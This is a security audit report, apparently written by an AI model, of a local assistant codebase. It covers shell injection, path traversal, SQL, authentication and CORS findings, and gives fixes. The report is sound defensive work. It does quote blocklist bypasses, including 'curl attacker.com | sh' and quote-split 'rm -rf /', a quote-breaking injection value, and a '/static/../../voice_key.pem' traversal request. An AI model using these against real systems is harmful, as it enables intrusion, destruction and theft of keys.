# SAM Brain Security Audit

**Date:** 2026-01-29
**Auditor:** Claude Opus 4.5 (automated)
**Scope:** `/Users/davidquinton/ReverseLab/SAM/warp_tauri/sam_brain/`
**Focus files:** `privacy_guard.py`, `approval_queue.py`, `execution/safe_executor.py`, `execution/command_classifier.py`, `sam_api.py`, `sam_agent.py`, `vision_server.py`, `voice/voice_server.py`

---

## Executive Summary

The SAM Brain codebase has a solid security-conscious design philosophy with approval queues, command classification, privacy scanning, and environment sanitization. However, several vulnerabilities were identified across eight audit categories. The most critical issues are: **unauthenticated API endpoints**, **path traversal in static file serving**, **shell injection via sam_agent.py**, and **wildcard CORS on all HTTP servers**.

**Severity breakdown:**
- CRITICAL: 3
- HIGH: 4
- MEDIUM: 5
- LOW: 3

---

## 1. Hardcoded Credentials / API Keys

**Severity: LOW**
**Status: Mostly clean**

No hardcoded API keys or credentials were found in the production code. The codebase handles secrets responsibly in several ways:

- `execution/safe_executor.py` (lines 89-121): Maintains a `SENSITIVE_ENV_VARS` set and strips all matching environment variables before subprocess execution. Also strips any env var containing `KEY`, `SECRET`, `TOKEN`, `PASSWORD`, or `CREDENTIAL` keywords (lines 548-553).
- `privacy_guard.py` (lines 48-118): Detects API keys, passwords, JWT tokens, private keys, AWS keys, and Stripe keys in outgoing text.
- `sam_enhanced.py` (line 389) and `sam.py` (line 287): Redact secrets from output using regex.
- `perpetual_learner.py` (lines 1606-1617): Reads `ANTHROPIC_API_KEY` from environment or keyfile -- not hardcoded.

**Issue found:**
- `voice_cert.pem` and `voice_key.pem` are present in the project directory. These are TLS certificate and private key files stored alongside code. While `voice_key.pem` has restrictive permissions (`-rw-------`), storing private keys in a project directory (even if not in a git repo currently) risks accidental exposure.

**Recommendation:** Move TLS key material to `~/.sam/certs/` or a dedicated secrets store. Reference via environment variable or config file.

---

## 2. Unsafe subprocess/os.system Calls

**Severity: CRITICAL**

### 2a. `sam_agent.py` -- Shell injection via tool execution (lines 148-161)

```python
# Line 148-150: User-influenced command passed directly to shell
result = subprocess.run(
    cmd, shell=True, cwd=cwd,
    capture_output=True, text=True, timeout=30
)
```

The `execute_tool()` function's `run` tool takes commands derived from LLM output and passes them directly to `shell=True`. The blocklist on line 139 is trivially bypassable:

```python
dangerous = ['rm -rf /', 'sudo rm', '> /dev/', 'dd if=', 'mkfs', ':(){']
```

This is a substring check, not a regex or command parser. Bypasses include:
- `rm -rf /tmp/../../../` (path traversal)
- `r'm' -rf /` (quote splitting)
- `env sudo rm` (prefix injection)
- Any command not on the short list (e.g., `curl attacker.com | sh`, `python3 -c "import os; os.system('...')"`)

### 2b. `sam_agent.py` -- Search tool injection (lines 156-161)

```python
result = subprocess.run(
    f"grep -rn '{arg}' --include='*.py' ...",
    shell=True, cwd=cwd, ...
)
```

The `arg` variable is interpolated directly into a shell command using single quotes. An attacker-controlled `arg` containing `'; malicious_command; echo '` would break out of the quotes and execute arbitrary commands.

### 2c. `execution/safe_executor.py` -- Shell=True with mitigations (line 795)

```python
use_shell = any(c in command for c in ["|", ">", "<", "&&", "||", ";", "$"])
if use_shell:
    args = command
```

This module uses `shell=True` conditionally, which is less risky because it has multiple layers of defense (blocked pattern regex, path validation, environment sanitization, resource limits, working directory whitelisting). However, the `_check_command_safety` function on line 606 can still be bypassed with creative encoding or alternate command names.

### 2d. Other subprocess calls

- `auto_coordinator.py` (line 371): `subprocess.run(full_cmd, ...)` -- unclear if user input reaches this.
- `unified_daemon.py` (lines 315, 425, 588): Multiple `shell=True` calls for service management.
- `cognitive/smart_vision.py` (line 437): `subprocess.run(cmd, shell=True, ...)` for vision processing.

**Recommendation:** Replace `sam_agent.py` tool execution with the `SafeExecutor` from `execution/safe_executor.py`. Never interpolate user input into shell command strings. Use `shlex.quote()` when shell execution is unavoidable.

---

## 3. SQL Injection Risks

**Severity: MEDIUM**

### 3a. `approval_queue.py` -- Dynamic UPDATE construction (line 541-543)

```python
conn.execute(
    f"UPDATE approval_items SET {', '.join(updates)} WHERE id = ?",
    values
)
```

The column names in `updates` are constructed from `**kwargs` keys (line 530). While the values use parameterized queries, the column names are injected directly via f-string. Currently the calling code only passes known column names, but if `_update_status` were called with attacker-controlled kwargs keys, this would be exploitable.

### 3b. `cognitive/enhanced_retrieval.py` -- Dynamic table/column names (line 631)

```python
f"SELECT rowid, {col} FROM {table} WHERE {col} LIKE ? LIMIT ?"
```

Table and column names are interpolated from database metadata, not user input. The LIKE value is properly parameterized. Low risk but not defense-in-depth.

### 3c. `cognitive/app_knowledge_extractor.py` -- Dynamic table name (line 982)

```python
cursor.execute(f"SELECT COUNT(*) FROM [{table_name}]")
```

Uses bracket-quoting for the table name, which provides some protection. Table names come from `sqlite_master`, not user input.

### 3d. `training_data.py` (line 894) and `feedback_system.py` (line 1407)

Both use dynamic UPDATE construction similar to approval_queue.py. Column names come from internal code, not user input, but the pattern is fragile.

**Recommendation:** Whitelist allowed column names in `_update_status` and similar dynamic SQL builders. For table/column names from metadata, validate against a known set.

---

## 4. Path Traversal Vulnerabilities

**Severity: CRITICAL**

### 4a. `sam_api.py` -- Static file serving (lines 4390-4407)

```python
static_dir = Path(__file__).parent / "static"
file_path = static_dir / path[8:]  # Remove /static/
if file_path.exists() and file_path.is_file():
    self.wfile.write(file_path.read_bytes())
```

**No path traversal validation.** A request to `/static/../../voice_key.pem` would resolve to the project root and serve the TLS private key. The `Path` join does not prevent traversal with `..` segments. There is no check that the resolved path is still within `static_dir`.

### 4b. `sam_agent.py` -- File read/write tools (lines 121-177)

```python
path = Path(cwd) / arg if not arg.startswith('/') else Path(arg)
```

The `read`, `list`, and `write` tools accept arbitrary paths with no validation. An absolute path like `/etc/passwd` would be read without restriction. The `write` tool (line 174-176) will write to any path the process can access, including creating parent directories.

### 4c. `execution/safe_executor.py` -- Properly validates paths

For contrast, `safe_executor.py` correctly validates paths against `ALLOWED_PROJECT_ROOTS` using `Path.resolve()` and `relative_to()` (lines 283-297). This is the correct pattern that other modules should adopt.

**Recommendation:** Add `resolve()` + containment check to `sam_api.py` static file serving:
```python
resolved = file_path.resolve()
if not str(resolved).startswith(str(static_dir.resolve())):
    return 403
```
Integrate `sam_agent.py` tool operations through `SafeExecutor`'s `FileOperation` class.

---

## 5. Sensitive Data in Logs

**Severity: MEDIUM**

### 5a. Execution logging (safe_executor.py, lines 675-692)

The execution log at `~/.sam/execution_log.jsonl` records commands but intentionally omits stdout/stderr content. This is good.

### 5b. `sam_api.py` -- HTTP handler logging disabled (line 4359)

```python
def log_message(self, format, *args):
    pass  # Quiet
```

HTTP request logging is completely suppressed. While this prevents logging sensitive query parameters, it also eliminates the audit trail for API access. An attacker exploiting the API would leave no trace.

### 5c. Error messages expose internals

Throughout `sam_api.py`, exception messages are returned to clients:
```python
except Exception as e:
    self.send_json({"error": str(e)}, 500)
```

This can leak file paths, database structures, and internal state to any client.

### 5d. `training_capture.py` (line 77)

Contains patterns to detect and redact secrets in training data, which is a positive finding.

**Recommendation:** Enable request logging for audit trail (log path and method, not query body). Sanitize error messages returned to clients -- return generic errors and log details server-side.

---

## 6. API Authentication

**Severity: CRITICAL**

### The API on port 8765 has NO authentication whatsoever.

`sam_api.py` runs an HTTP server (line 4353) with:
- No API key requirement
- No token verification
- No session management
- No rate limiting
- No IP allowlisting

Any process on the local machine (or any device on the same network if bound to 0.0.0.0) can:
- Read all SAM memory and project data via `/api/memory`, `/api/projects`
- Execute queries via `/api/query`
- Approve or reject pending commands via `/api/approval/approve`, `/api/approval/reject`
- Trigger code execution indirectly through the approval system
- Access all facts and conversation history

### Vision server (port 8766) -- also unauthenticated

`vision_server.py` provides image processing endpoints with no authentication.

### Voice server -- also unauthenticated

`voice/voice_server.py` uses FastAPI with no authentication middleware.

**Recommendation:** At minimum, implement a shared secret (API key) loaded from `~/.sam/api_key` and required as a header on all requests. For network-exposed services, bind to `127.0.0.1` only.

---

## 7. CORS Configuration

**Severity: HIGH**

### All three HTTP servers use `Access-Control-Allow-Origin: *`

- `sam_api.py` (line 4365): Every response includes `Access-Control-Allow-Origin: *`
- `vision_server.py` (lines 132, 139): Wildcard CORS
- `voice/voice_server.py` (lines 290-291): FastAPI CORS middleware with `allow_origins=["*"]`

Combined with the lack of authentication, this means **any website visited in a browser on this machine can make requests to the SAM API and read responses**. A malicious webpage could:
1. Probe `localhost:8765` to discover SAM
2. Read all memory, projects, and conversation history
3. Approve pending commands in the approval queue
4. Exfiltrate data to a remote server

This is a Cross-Site Request Forgery (CSRF) and data exfiltration vector.

**Recommendation:** Restrict CORS to known origins (e.g., `tauri://localhost`, `https://localhost:*`). For the Tauri app, CORS may not be needed at all since Tauri uses its own IPC mechanism.

---

## 8. Unsafe File Operations

**Severity: HIGH**

### 8a. `sam_agent.py` write tool -- no restrictions (lines 163-177)

```python
path = Path(cwd) / arg if not arg.startswith('/') else Path(arg)
path.parent.mkdir(parents=True, exist_ok=True)
path.write_text(content)
```

- No path validation
- No file size limits
- No file type restrictions
- Creates parent directories automatically (`mkdir -p` equivalent)
- Can write to any writable location on the filesystem
- Content comes from LLM output, which could be manipulated via prompt injection

### 8b. `execution/safe_executor.py` -- properly secured (lines 333-407)

The `FileOperation.write_file()` method correctly implements:
- Path validation against allowed roots
- File size limits (`max_size_mb`)
- Automatic backup before overwrite
- Proper error handling

### 8c. `sam_api.py` static file serving -- no sanitization

As noted in section 4a, static file serving has no path containment checks.

**Recommendation:** All file operations should route through `FileOperation` from `safe_executor.py`. The `sam_agent.py` code should be refactored to use the safe execution framework.

---

## Positive Security Findings

The codebase demonstrates significant security awareness in several areas:

1. **`execution/safe_executor.py`** is well-designed:
   - Environment sanitization strips 30+ sensitive variables
   - Blocked command pattern list with regex matching
   - Path validation against allowed project roots
   - Resource limits (memory, CPU time, core dumps disabled)
   - Process group isolation (`start_new_session=True`)
   - Automatic backup before file modifications
   - Execution audit logging

2. **`execution/command_classifier.py`** is thorough:
   - 40+ dangerous patterns with severity classification
   - Safe command whitelist approach
   - Detection of command chaining, path traversal, privilege escalation
   - Trusted host whitelist for network operations

3. **`approval_queue.py`** provides good operational security:
   - Parameterized SQL throughout (values, not column names)
   - Thread-safe with `RLock`
   - Blocked commands raise `ValueError` immediately
   - Automatic expiration of stale requests
   - Full audit trail

4. **`privacy_guard.py`** is a thoughtful PII scanner:
   - Detects SSN, credit cards, API keys, private keys, JWT tokens
   - Advisory rather than blocking -- respects user autonomy
   - Masked display of sensitive values

5. **Training data capture** (`training_capture.py`) has secret detection patterns to prevent credentials from entering training data.

---

## Risk Summary Table

| # | Finding | Severity | File(s) | Line(s) |
|---|---------|----------|---------|---------|
| 1 | TLS private key in project directory | LOW | `voice_key.pem` | -- |
| 2 | Shell injection via sam_agent.py run tool | CRITICAL | `sam_agent.py` | 148-151 |
| 3 | Shell injection via sam_agent.py search tool | HIGH | `sam_agent.py` | 156-161 |
| 4 | Trivially bypassable blocklist in sam_agent.py | HIGH | `sam_agent.py` | 139-141 |
| 5 | Dynamic SQL column names from kwargs | MEDIUM | `approval_queue.py` | 530-543 |
| 6 | Dynamic SQL table/column names | LOW | `enhanced_retrieval.py` | 631 |
| 7 | Path traversal in static file serving | CRITICAL | `sam_api.py` | 4390-4403 |
| 8 | Unrestricted file read/write in agent | HIGH | `sam_agent.py` | 121-177 |
| 9 | HTTP logging disabled (no audit trail) | MEDIUM | `sam_api.py` | 4359 |
| 10 | Exception details leaked to clients | MEDIUM | `sam_api.py` | various |
| 11 | No API authentication on any endpoint | CRITICAL | `sam_api.py`, `vision_server.py`, `voice_server.py` | -- |
| 12 | Wildcard CORS on all servers | HIGH | `sam_api.py`, `vision_server.py`, `voice_server.py` | -- |
| 13 | Unrestricted file writes from LLM output | MEDIUM | `sam_agent.py` | 163-177 |
| 14 | shell=True in multiple modules | MEDIUM | `unified_daemon.py`, `smart_vision.py`, `sam_enhanced.py` | various |
| 15 | Approval queue accessible without auth | LOW | `sam_api.py` | 4428+ |

---

## Recommended Priority Fixes

### Immediate (P0)
1. **Add path traversal protection** to `sam_api.py` static file serving
2. **Refactor `sam_agent.py`** to use `SafeExecutor` and `FileOperation` instead of raw `subprocess.run(shell=True)` and `Path.write_text()`
3. **Add authentication** to port 8765, 8766, and voice server -- at minimum a shared secret header

### Short-term (P1)
4. **Restrict CORS** to known Tauri/localhost origins
5. **Bind servers to 127.0.0.1** explicitly (verify current binding)
6. **Move TLS key material** out of the project directory
7. **Add request audit logging** (method + path, not body)

### Medium-term (P2)
8. **Whitelist column names** in dynamic SQL UPDATE builders
9. **Sanitize error responses** -- log details server-side, return generic messages to clients
10. **Add rate limiting** to API endpoints
11. **Audit all `shell=True` calls** across the codebase and convert to `shell=False` where possible
